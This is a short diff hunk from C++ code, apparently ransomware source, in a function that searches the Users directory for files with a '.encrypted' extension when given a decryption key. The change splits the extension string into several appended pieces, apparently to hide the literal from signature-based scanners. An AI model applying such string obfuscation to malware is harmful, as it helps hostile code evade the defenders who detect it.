@@ -850,7 +850,7 @@ DWORD FindEncryptedFiles(std::string decryptionKey)
 	// Using lowercase extenstions
 	//const std::string encrypted = ".encrypted";
 	std::string encrypted = "";
-	encrypted.append(".en").append("cr").append("yp").append("t").append("ed");
+	encrypted.append(".").append("en").append("cr").append("yp").append("t").append("ed");
 
 	// Restricting search path to the Users directory
 	std::string path = ""; // c:\\users
